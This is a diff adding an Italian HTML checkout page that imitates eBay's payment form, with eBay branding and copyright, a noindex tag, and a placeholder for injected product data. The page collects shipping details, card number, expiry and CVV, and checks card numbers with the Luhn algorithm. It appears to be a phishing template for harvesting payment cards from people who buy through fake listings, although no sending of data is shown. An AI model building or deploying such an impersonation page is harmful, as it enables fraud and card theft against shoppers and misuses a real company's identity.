@@ -1,0 +1,143 @@
+<!doctype html>
+<html lang="it">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Paga</title>
+<meta name="robots" content="noindex" />
+<style>
+  *{box-sizing:border-box}
+  body{margin:0;font-family:"Market Sans",Arial,Helvetica,sans-serif;color:#191919;background:#fff;font-size:15px}
+  a{color:#3665f3}
+  .wrap{max-width:1440px;margin:0 auto;padding:16px 24px 40px}
+  .hdr{display:flex;justify-content:space-between;align-items:flex-start;padding:8px 0 40px}
+  .brand{display:flex;align-items:center;gap:14px;text-decoration:none;color:#191919}
+  .brand img{height:52px}
+  .brand b{font-size:26px}
+  .hdr-r{text-align:right;line-height:1.6}
+  .grid{display:grid;grid-template-columns:1fr 360px;gap:24px;align-items:start}
+  .box{border:1px solid #e5e5e5;padding:20px 24px;margin-bottom:24px}
+  h2{font-size:18px;margin:0 0 16px}
+  .seller{display:flex;gap:10px;align-items:center;margin-bottom:20px}
+  .av{width:36px;height:36px;border-radius:50%;background:#e5e5e5}
+  .muted{color:#707070}
+  .item{display:flex;gap:40px;padding-left:24px}
+  .item img{width:82px;height:110px;object-fit:cover;border-radius:6px;background:#f2f2f2}
+  .item .t{color:#191919;font-size:16px}
+  .item .p{font-weight:700;font-size:18px;margin:14px 0 6px}
+  .ship{margin-top:30px;line-height:1.6}
+  .fld{display:block;width:100%;height:48px;border:1px solid #8f8f8f;border-radius:8px;padding:0 14px;font-size:15px;margin-bottom:12px;font-family:inherit}
+  .fld:focus{outline:2px solid #3665f3;border-color:#3665f3}
+  .row{display:flex;gap:12px}
+  .row .fld{flex:1}
+  .pay{border:1px solid #e5e5e5;margin-bottom:24px}
+  .pay h2{padding:20px 24px;margin:0;border-bottom:1px solid #e5e5e5}
+  .opt{display:flex;gap:20px;align-items:center;padding:20px 24px}
+  .radio{width:20px;height:20px;border-radius:50%;border:2px solid #191919;display:flex;align-items:center;justify-content:center}
+  .radio::after{content:"";width:10px;height:10px;border-radius:50%;background:#191919}
+  .cards{display:flex;gap:6px;margin-top:6px}
+  .cards span{border:1px solid #ccc;border-radius:3px;width:40px;height:24px;display:flex;align-items:center;justify-content:center;font-size:10px;font-weight:700}
+  .cform{padding:0 24px 24px 64px}
+  .sum{border:1px solid #e5e5e5;padding:20px 24px}
+  .sum h1{font-size:28px;margin:0 0 20px}
+  .line{display:flex;justify-content:space-between;margin-bottom:14px}
+  .tot{border-top:1px solid #e5e5e5;padding-top:24px;font-weight:700;font-size:18px}
+  .note{background:#f7f7f7;padding:14px 22px;font-size:13px;line-height:1.5;margin:20px 0}
+  .btn{width:100%;height:56px;border:0;border-radius:28px;font-size:18px;font-weight:700;color:#fff;background:#3665f3;cursor:pointer}
+  .btn:disabled{background:#c7c7c7;cursor:not-allowed}
+  .hint{text-align:center;margin:20px 0}
+  .prot{display:flex;gap:10px;font-size:14px;line-height:1.7}
+  .prot i{width:28px;height:28px;border-radius:50%;background:#3665f3;color:#fff;font-style:normal;display:flex;align-items:center;justify-content:center;flex:none}
+  .ok{display:none;background:#e9f7ee;color:#05823f;padding:12px;border-radius:8px;margin-top:12px;text-align:center}
+  .foot{font-size:13px;margin-top:60px}
+  @media(max-width:900px){.grid{grid-template-columns:1fr}.hdr-r{display:none}.item{gap:16px;padding:0}.cform{padding:0 24px 24px}}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="hdr">
+    <a class="brand" id="logoLink" href="#"><img id="logo" alt="" /><b>Paga</b></a>
+    <div class="hdr-r">Ti piace il nuovo modulo di pagamento? <a href="#">Dicci quello che pensi</a><br/>Hai un account? <a href="#">Accedi</a></div>
+  </div>
+  <div class="grid">
+    <div>
+      <div class="box">
+        <h2>Rivedi l'ordine</h2>
+        <div class="seller"><div class="av"></div><div><span id="seller"></span> · <a href="#">Aggiungi un messaggio per il venditore</a><div class="muted" style="font-size:13px" id="fb"></div></div></div>
+        <div class="item">
+          <img id="img" alt="" />
+          <div>
+            <a href="#" class="t" id="title"></a>
+            <div class="muted" id="cond"></div>
+            <div class="p" id="price"></div>
+            <div class="muted">Quantità 1</div>
+            <div class="ship"><b>Spedizione</b><br/><span id="deliv"></span><br/>Poste delivery standard<br/><b id="shipc"></b></div>
+          </div>
+        </div>
+      </div>
+      <div class="box">
+        <h2>Indirizzo di spedizione</h2>
+        <input class="fld req" placeholder="Nome e cognome" autocomplete="name" />
+        <input class="fld req" placeholder="Via e numero civico" autocomplete="street-address" />
+        <div class="row"><input class="fld req" placeholder="CAP" autocomplete="postal-code" /><input class="fld req" placeholder="Città" autocomplete="address-level2" /><input class="fld req" placeholder="Provincia" style="max-width:120px" /></div>
+        <input class="fld req" type="email" placeholder="Email" autocomplete="email" />
+        <input class="fld req" type="tel" placeholder="Telefono" autocomplete="tel" />
+      </div>
+      <div class="pay">
+        <h2>Paga con</h2>
+        <div class="opt"><div class="radio"></div><div>Aggiungi una nuova carta<div class="cards"><span style="color:#1a1f71">VISA</span><span><svg width="22" height="14"><circle cx="8" cy="7" r="6" fill="#eb001b"/><circle cx="14" cy="7" r="6" fill="#f79e1b" opacity=".9"/></svg></span><span style="color:#0079be">Diners</span><span style="font-size:7px">postepay</span></div></div></div>
+        <div class="cform">
+          <input class="fld req" id="cnum" inputmode="numeric" placeholder="Numero della carta" autocomplete="cc-number" maxlength="23" />
+          <div class="row"><input class="fld req" id="cexp" inputmode="numeric" placeholder="Scadenza (MM/AA)" autocomplete="cc-exp" maxlength="5" /><input class="fld req" id="ccvv" inputmode="numeric" placeholder="Codice di sicurezza" autocomplete="cc-csc" maxlength="4" /></div>
+          <div class="row"><input class="fld req" placeholder="Nome" autocomplete="cc-given-name" /><input class="fld req" placeholder="Cognome" autocomplete="cc-family-name" /></div>
+        </div>
+      </div>
+    </div>
+    <div class="sum">
+      <h1>Riepilogo ordine</h1>
+      <div class="line"><span>Oggetto (1)</span><span id="s1"></span></div>
+      <div class="line"><span>Spedizione</span><span id="s2"></span></div>
+      <div class="line tot"><span>Totale ordine</span><span id="s3"></span></div>
+      <div class="note">*L'IVA sulla tariffa per la Protezione acquisti varia in base al luogo in cui si trova l'acquirente. <a href="#">Scopri di più</a></div>
+      <button class="btn" id="pay" disabled>Conferma e paga</button>
+      <div class="hint" id="hint">Completa i dati della carta</div>
+      <div class="ok" id="ok">Pagamento in elaborazione…</div>
+      <div class="prot"><i>€</i><span>Acquisto protetto dalla <a href="#"><b>Garanzia cliente eBay</b></a></span></div>
+    </div>
+  </div>
+  <div class="foot">Copyright © 1995-2026 eBay Inc. Tutti i diritti riservati. <a href="#">Accessibilità</a>, <a href="#">Accordo per gli utenti</a>, <a href="#">Privacy</a>, <a href="#">Cookie</a></div>
+</div>
+<script>
+  const P = /*__PRODOTTO__*/null;
+  const $ = (id) => document.getElementById(id);
+  const num = (s) => { const m = String(s||"").match(/(\d[\d.]*,\d{2}|\d+(?:[.,]\d+)?)/); if(!m) return 0; let v=m[1]; if(v.includes(",")) v=v.replace(/\./g,"").replace(",","."); return parseFloat(v)||0; };
+  const eur = (n) => "EUR " + n.toFixed(2).replace(".", ",");
+  if (P) {
+    $("logo").src = P.logoUrl || ""; $("logoLink").href = P.logoLink || "#";
+    $("seller").textContent = P.venditore || ""; $("fb").textContent = P.feedbackVenditore || "";
+    $("img").src = (P.immagini && P.immagini[0]) || ""; $("title").textContent = P.titolo || "";
+    $("title").href = location.pathname.replace(/\/checkout\/?$/, "");
+    $("cond").textContent = P.condizione || "";
+    const price = num(P.prezzo), shipTxt = P.spedizione || "", ship = /gratuit/i.test(shipTxt) ? 0 : num(shipTxt);
+    $("price").textContent = eur(price); $("deliv").textContent = P.consegna || "";
+    $("shipc").textContent = ship ? eur(ship) : "Gratuita";
+    $("s1").textContent = eur(price); $("s2").textContent = ship ? eur(ship) : "Gratuita"; $("s3").textContent = eur(price + ship);
+  }
+  const fmt = { cnum: (v) => v.replace(/\D/g,"").slice(0,19).replace(/(.{4})/g,"$1 ").trim(),
+    cexp: (v) => { v=v.replace(/\D/g,"").slice(0,4); return v.length>2 ? v.slice(0,2)+"/"+v.slice(2) : v; },
+    ccvv: (v) => v.replace(/\D/g,"").slice(0,4) };
+  const luhn = (s) => { let t=0, a=false; for (let i=s.length-1;i>=0;i--){ let d=+s[i]; if(a){d*=2; if(d>9)d-=9;} t+=d; a=!a;} return t%10===0; };
+  function valid() {
+    const all = [...document.querySelectorAll(".req")].every((i) => i.value.trim() && i.checkValidity());
+    const n = $("cnum").value.replace(/\D/g,""), e = $("cexp").value.match(/^(\d{2})\/(\d{2})$/);
+    const expOk = e && +e[1]>=1 && +e[1]<=12 && new Date(2000+ +e[2], +e[1]) > new Date();
+    return all && n.length>=13 && luhn(n) && expOk && $("ccvv").value.length>=3;
+  }
+  document.querySelectorAll(".req").forEach((i) => i.addEventListener("input", () => {
+    if (fmt[i.id]) i.value = fmt[i.id](i.value);
+    const ok = valid(); $("pay").disabled = !ok; $("hint").style.display = ok ? "none" : "block";
+  }));
+  $("pay").addEventListener("click", () => { $("pay").disabled = true; $("ok").style.display = "block"; });
+</script>
+</body>
+</html>
